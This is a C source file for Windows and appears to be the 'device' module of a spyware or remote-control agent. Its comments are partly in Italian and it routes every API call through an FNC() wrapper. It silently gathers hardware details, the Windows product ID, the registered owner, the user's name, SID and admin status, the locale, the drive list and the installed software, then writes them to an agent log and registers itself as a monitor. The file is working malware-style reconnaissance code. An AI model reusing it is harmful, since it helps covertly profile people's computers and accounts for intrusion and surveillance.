#include <lm.h>

struct deviceinfo {
	struct {
		WCHAR delta[128];		// Date delta
	} timeinfo;
	struct {
		WCHAR proc[128];		// Processor description
		DWORD procnum;			// Number of processors
	} procinfo;
	struct {
		DWORD memtotal;			// Total physical memory (MB)
		DWORD memfree;			// Free physical memory (MB)
		DWORD memload;			// Memory load percentage
	} meminfo;
	struct {
		WCHAR ver[64];			// Windows version description
		WCHAR sp[64];			// Windows service pack description
		WCHAR id[64];			// Windows product ID
		WCHAR owner[64];		// Registered owner
		WCHAR org[64];			// Registered organization
	} osinfo;
	struct {
		WCHAR username[64];		// Name
		WCHAR fullname[64];		// Fullname
		WCHAR sid[64];			// SID
		DWORD priv;				// Privilege level (USER_PRIV_GUEST, USER_PRIV_USER, USER_PRIV_ADMIN)
	} userinfo;
	struct {
		DWORD timebias;			// Time bias from UTC (min)
		WCHAR lang[16];			// Language name
		WCHAR country[16];		// Country name
	} localinfo;
	struct {
		DWORD disktotal;		// Total disk space (MB)
		DWORD diskfree;			// Free disk space (MB)
	} diskinfo;
	struct {
		BOOL ac_connected;		// Connected to AC
		DWORD battery_level;	// % of battery
	} batteryinfo;
};

VOID GetDeviceInfo(struct deviceinfo *di)
{
	HKEY hKey = NULL;
	DWORD len;
	SYSTEM_INFO sysinfo;
	MEMORYSTATUSEX memstatus;
	LPUSER_INFO_1 userinfo1 = NULL;
	LPUSER_INFO_23 userinfo23 = NULL;
	WCHAR *sidstr = NULL;
	WCHAR homepath[MAX_PATH];
	ULARGE_INTEGER disktotal, diskfree;
	SYSTEM_POWER_STATUS sps;
	long long date_delta_l;
	BOOL negative_delta;
	DWORD seconds, minutes, hours, days;

	/***\
	*   *   Time
	\***/
	date_delta_l = date_delta.hi_delay;
	date_delta_l = date_delta_l << 32;
	date_delta_l += date_delta.lo_delay;
	if (date_delta_l < 0) {
		negative_delta = TRUE;
		date_delta_l = -date_delta_l;
	} else
		negative_delta =FALSE;

	date_delta_l /= 10000000; // otteniamo i secondi
	seconds = (DWORD)(date_delta_l % 60);
	date_delta_l /= 60; // otteniamo i minuti
	minutes = (DWORD)(date_delta_l % 60);
	date_delta_l /= 60; // otteniamo le ore
	hours = (DWORD)(date_delta_l % 24);
	date_delta_l /= 24; // otteniamo i giorni
	days = (DWORD)date_delta_l;

	if (days > 0)
		_snwprintf_s(di->timeinfo.delta, sizeof(di->timeinfo.delta)/sizeof(di->timeinfo.delta[0]), _TRUNCATE, 
						L"%s%dd %.2d:%.2d:%.2d", negative_delta ? L"-" : L"+", days, hours, minutes, seconds);
	else
		_snwprintf_s(di->timeinfo.delta, sizeof(di->timeinfo.delta)/sizeof(di->timeinfo.delta[0]), _TRUNCATE, 
						L"%s%.2d:%.2d:%.2d", negative_delta ? L"-" : L"+", hours, minutes, seconds);
	
	/***\
	*   *   Battery
	\***/

	di->batteryinfo.ac_connected = TRUE;
	di->batteryinfo.battery_level = 0;
	if (FNC(GetSystemPowerStatus)(&sps)) {
		if (sps.ACLineStatus == 0) {
			di->batteryinfo.ac_connected = FALSE;
		}
		if(sps.BatteryLifePercent != 255)
			di->batteryinfo.battery_level = sps.BatteryLifePercent;
	}



	/***\
	*   *   Processor
	\***/

	do {
		if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
			di->procinfo.proc[0] = L'\0';
			break;
		}

		len = sizeof(di->procinfo.proc);
		if(FNC(RegQueryValueExW)(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)di->procinfo.proc, &len) != ERROR_SUCCESS) {
			di->procinfo.proc[0] = L'\0';
		}
	} while(0);

	if(hKey) {
		FNC(RegCloseKey)(hKey);
		hKey = NULL;
	}

	FNC(GetSystemInfo)(&sysinfo);

	di->procinfo.procnum = sysinfo.dwNumberOfProcessors;



	/***\
	*   *   Memory
	\***/

	memstatus.dwLength = sizeof(memstatus);

	FNC(GlobalMemoryStatusEx)(&memstatus);

	di->meminfo.memtotal = (DWORD)(memstatus.ullTotalPhys / (1024 * 1024));
	di->meminfo.memfree = (DWORD)(memstatus.ullAvailPhys / (1024 * 1024));
	di->meminfo.memload = (DWORD)(memstatus.dwMemoryLoad);



	/***\
	*   *   OS
	\***/

	do {
		if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
			di->osinfo.ver[0] = L'\0';
			di->osinfo.sp[0] = L'\0';
			di->osinfo.id[0] = L'\0';
			di->osinfo.owner[0] = L'\0';
			di->osinfo.org[0] = L'\0';
			break;
		}

		len = sizeof(di->osinfo.ver);
		if(FNC(RegQueryValueExW)(hKey, L"ProductName", NULL, NULL, (LPBYTE)di->osinfo.ver, &len) != ERROR_SUCCESS) {
			di->osinfo.ver[0] = L'\0';
		}

		len = sizeof(di->osinfo.sp);
		if(FNC(RegQueryValueExW)(hKey, L"CSDVersion", NULL, NULL, (LPBYTE)di->osinfo.sp, &len) != ERROR_SUCCESS) {
			di->osinfo.sp[0] = L'\0';
		}

		len = sizeof(di->osinfo.id);
		if(FNC(RegQueryValueExW)(hKey, L"ProductId", NULL, NULL, (LPBYTE)di->osinfo.id, &len) != ERROR_SUCCESS) {
			di->osinfo.id[0] = L'\0';
		}

		len = sizeof(di->osinfo.owner);
		if(FNC(RegQueryValueExW)(hKey, L"RegisteredOwner", NULL, NULL, (LPBYTE)di->osinfo.owner, &len) != ERROR_SUCCESS) {
			di->osinfo.owner[0] = L'\0';
		}

		len = sizeof(di->osinfo.org);
		if(FNC(RegQueryValueExW)(hKey, L"RegisteredOrganization", NULL, NULL, (LPBYTE)di->osinfo.org, &len) != ERROR_SUCCESS) {
			di->osinfo.org[0] = L'\0';
		}
	} while(0);

	if(hKey) {
		FNC(RegCloseKey)(hKey);
		hKey = NULL;
	}



	/***\
	*   *   User
	\***/

	do {
		len = sizeof(di->userinfo.username) / sizeof(di->userinfo.username[0]);
		if(!FNC(GetUserNameW)(di->userinfo.username, &len)) {
			di->userinfo.username[0] = L'\0';
			break;
		}

		if(FNC(NetUserGetInfo)(NULL, di->userinfo.username, 1, (LPBYTE *)&userinfo1) == NERR_Success) {
			di->userinfo.priv = userinfo1->usri1_priv;
		} else {
			di->userinfo.priv = 0;
		}

		if(FNC(NetUserGetInfo)(NULL, di->userinfo.username, 23, (LPBYTE *)&userinfo23) != NERR_Success) {
			di->userinfo.fullname[0] = L'\0';
			di->userinfo.sid[0] = L'\0';
			break;
		}

		wcsncpy_s(di->userinfo.fullname, sizeof(di->userinfo.fullname) / sizeof(di->userinfo.fullname[0]), userinfo23->usri23_full_name, _TRUNCATE);

		if(!FNC(ConvertSidToStringSidW)(userinfo23->usri23_user_sid, &sidstr)) {
			di->userinfo.sid[0] = L'\0';
		} else {
			wcsncpy_s(di->userinfo.sid, sizeof(di->userinfo.sid) / sizeof(di->userinfo.sid[0]), sidstr, _TRUNCATE);
		}
	} while(0);

	if(sidstr) LocalFree(sidstr);
	if(userinfo1) FNC(NetApiBufferFree)(userinfo1);
	if(userinfo23) FNC(NetApiBufferFree)(userinfo23);



	/***\
	*   *   Local
	\***/

	if(!FNC(GetLocaleInfoW)(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, di->localinfo.lang, sizeof(di->localinfo.lang) / sizeof(di->localinfo.lang[0]))) {
		di->localinfo.lang[0] = L'\0';
	}

	if(!FNC(GetLocaleInfoW)(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, di->localinfo.country, sizeof(di->localinfo.country) / sizeof(di->localinfo.country[0]))) {
		di->localinfo.country[0] = L'\0';
	}

	do {
		if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
			di->procinfo.proc[0] = L'\0';
			break;
		}

		len = sizeof(di->procinfo.proc);
		if(FNC(RegQueryValueExW)(hKey, L"ActiveTimeBias", NULL, NULL, (LPBYTE)&di->localinfo.timebias, &len) != ERROR_SUCCESS) {
			di->localinfo.timebias = 0;
		}
	} while(0);

	if(hKey) {
		FNC(RegCloseKey)(hKey);
		hKey = NULL;
	}



	/***\
	*   *   Disk
	\***/

	if(!FNC(GetEnvironmentVariableW)(L"TMP", homepath, sizeof(homepath))) {
		wcsncpy_s(homepath, sizeof(homepath) / sizeof(homepath[0]), L"C:\\", _TRUNCATE);
	}

	if(FNC(GetDiskFreeSpaceExW)(homepath, &diskfree, &disktotal, NULL)) {
		di->diskinfo.disktotal = (DWORD)(disktotal.QuadPart / (1024 * 1024));
		di->diskinfo.diskfree = (DWORD)(diskfree.QuadPart / (1024 * 1024));
	} else {
		di->diskinfo.disktotal = 0;
		di->diskinfo.diskfree = 0;
	}



	return;
}

#define DRIVE_HEADER_TEXT L"\n\nDrive List:\n"
void GetDriveList(HANDLE hfile)
{
	WCHAR drive_letter[4];
	WCHAR drive_name[256];
	WCHAR type_name[5][20]={L"removable", L"disk", L"network", L"cd-rom", L"ram disk"};
	WCHAR device_info_string[512];
	DWORD type;
	
	drive_letter[1]=L':';
	drive_letter[2]=L'\\';
	drive_letter[3]=0;

	Log_WriteFile(hfile, (BYTE *)DRIVE_HEADER_TEXT, wcslen(DRIVE_HEADER_TEXT) * sizeof(WCHAR));

	for (drive_letter[0]=L'A'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
		type = FNC(GetDriveTypeW)(drive_letter);

		if (type>=DRIVE_REMOVABLE && type<=DRIVE_RAMDISK) {
			ZeroMemory(drive_name, sizeof(drive_name));
			FNC(GetVolumeInformationW)(drive_letter, drive_name, 255, NULL, NULL, NULL, NULL, 0);

			if (wcslen(drive_name))
				_snwprintf_s(device_info_string, sizeof(device_info_string)/sizeof(device_info_string[0]), _TRUNCATE, 
					L"%s \"%s\" (%s)\n", drive_letter, drive_name, type_name[type-DRIVE_REMOVABLE]);
			else
				_snwprintf_s(device_info_string, sizeof(device_info_string)/sizeof(device_info_string[0]), _TRUNCATE, 
					L"%s (%s)\n", drive_letter, type_name[type-DRIVE_REMOVABLE]);

			Log_WriteFile(hfile, (BYTE *)device_info_string, wcslen(device_info_string) * sizeof(WCHAR));
		}
	}
}

#define APPLICATION_HEADER_TEXT L"\n\nApplication List:\n"
VOID GetApplicationInfo(HANDLE hfile, BOOL bX64View)
{
	HKEY hKeyUninstall = NULL, hKeyProgram = NULL;
	DWORD dwordval, index, len;
	WCHAR stringval[128], product[256];
	ULONG uSamDesidered = KEY_READ;
     if (bX64View)
         uSamDesidered |= KEY_WOW64_64KEY;

	do {
		index = 0;

		if(FNC(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, uSamDesidered, &hKeyUninstall) != ERROR_SUCCESS) {
			break;
		}

		Log_WriteFile(hfile, (BYTE *)APPLICATION_HEADER_TEXT, wcslen(APPLICATION_HEADER_TEXT) * sizeof(WCHAR));

		while(1) {
			if(hKeyProgram) {
				FNC(RegCloseKey)(hKeyProgram);
				hKeyProgram = NULL;
			}

			len = sizeof(stringval) / sizeof(stringval[0]);
			if(FNC(RegEnumKeyExW)(hKeyUninstall, index++, stringval, &len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

			if(FNC(RegOpenKeyExW)(hKeyUninstall, stringval, 0, KEY_READ, &hKeyProgram) != ERROR_SUCCESS) continue;

			if(!FNC(RegQueryValueExW)(hKeyProgram, L"ParentKeyName", NULL, NULL, NULL, NULL)) continue;

			len = sizeof(dwordval);
			if(!FNC(RegQueryValueExW)(hKeyProgram, L"SystemComponent", NULL, NULL, (LPBYTE)&dwordval, &len) && (dwordval == 1)) continue;

			len = sizeof(stringval);
			if(FNC(RegQueryValueExW)(hKeyProgram, L"DisplayName", NULL, NULL, (LPBYTE)stringval, &len)) continue;

			wcsncpy_s(product, sizeof(product) / sizeof(product[0]), stringval, _TRUNCATE);

			len = sizeof(stringval);
			if(!FNC(RegQueryValueExW)(hKeyProgram, L"DisplayVersion", NULL, NULL, (LPBYTE)stringval, &len)) {
				wcsncat_s(product, sizeof(product) / sizeof(product[0]), L"   (", _TRUNCATE);
				wcsncat_s(product, sizeof(product) / sizeof(product[0]), stringval, _TRUNCATE);
				wcsncat_s(product, sizeof(product) / sizeof(product[0]), L")", _TRUNCATE);
			}

			wcsncat_s(product, sizeof(product) / sizeof(product[0]), L"\n", _TRUNCATE);

			Log_WriteFile(hfile, (BYTE *)product, wcslen(product) * sizeof(WCHAR));
		}
	} while(0);

	if(hKeyUninstall) {
		FNC(RegCloseKey)(hKeyUninstall);
		hKeyUninstall = NULL;
	}

	return;
}


void DumpDeviceInfo()
{
	HANDLE hfile;
	WCHAR null_wchar = 0;
	struct deviceinfo di;
	WCHAR device_info_string[ (sizeof(di)/sizeof(WCHAR)) +  512 ];

	memset (&di, 0, sizeof(di));
	GetDeviceInfo(&di);

	_snwprintf_s(device_info_string, sizeof(device_info_string)/sizeof(device_info_string[0]), _TRUNCATE, 
		L"Processor: %d x %s\n"
		L"Memory: %dMB free / %dMB total (%u%% used)\n"
		L"Disk: %dMB free / %dMB total\n"
		L"Battery: %s%d%%\n"
		L"\n"
		L"OS Version: %s%s%s%s%s\n"
		L"Registered to: %s%s%s%s {%s}\n"
		L"Locale settings: %s_%s (UTC %+.2d:%.2d)\n"
		L"Time delta: %s\n"
		L"\n"
		L"User: %s%s%s%s%s\n"
		L"SID: %s", 
		di.procinfo.procnum, di.procinfo.proc,
		di.meminfo.memfree, di.meminfo.memtotal, di.meminfo.memload, 
		di.diskinfo.diskfree, di.diskinfo.disktotal,
		(di.batteryinfo.ac_connected) ? L"AC Connected - " : L"", di.batteryinfo.battery_level,
		di.osinfo.ver, (di.osinfo.sp[0]) ? L" (" : L"", (di.osinfo.sp[0]) ? di.osinfo.sp : L"", (di.osinfo.sp[0]) ? L")" : L"", IsX64System() ? L" (64bit)" : L" (32bit)",
		di.osinfo.owner, (di.osinfo.org[0]) ? L" (" : L"", (di.osinfo.org[0]) ? di.osinfo.org : L"", (di.osinfo.org[0]) ? L")" : L"", di.osinfo.id,
		di.localinfo.lang, di.localinfo.country, (-1 * (int)di.localinfo.timebias) / 60, abs((int)di.localinfo.timebias) % 60,
		di.timeinfo.delta,
		di.userinfo.username, (di.userinfo.fullname[0]) ? L" (" : L"", (di.userinfo.fullname[0]) ? di.userinfo.fullname : L"", (di.userinfo.fullname[0]) ? L")" : L"", (di.userinfo.priv) ? ((di.userinfo.priv == 1) ? L"" : L" {ADMIN}") : L" {GUEST}",
		di.userinfo.sid);

	hfile = Log_CreateFile(PM_DEVICEINFO, NULL, 0);
	Log_WriteFile(hfile, (BYTE *)device_info_string, wcslen(device_info_string) * sizeof(WCHAR));

	// Enumera i drive presenti
	GetDriveList(hfile);

	GetApplicationInfo(hfile, FALSE);
	GetApplicationInfo(hfile, TRUE);
	
	// NULL termina tutta la stringa
	Log_WriteFile(hfile, (BYTE *)&null_wchar, sizeof(WCHAR));

	Log_CloseFile(hfile);
}


DWORD __stdcall PM_DeviceInfoStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Questo agente non ha stato started/stopped, ma quando
	// viene avviato esegue un'azione istantanea.
	if (bStartFlag && bReset) 
		DumpDeviceInfo();

	return 1;
}


DWORD __stdcall PM_DeviceInfoInit(JSONObject elem)
{
	return 1;
}


void PM_DeviceInfoRegister()
{
	AM_MonitorRegister(L"device", PM_DEVICEINFO, NULL, (BYTE *)PM_DeviceInfoStartStop, (BYTE *)PM_DeviceInfoInit, NULL);
}
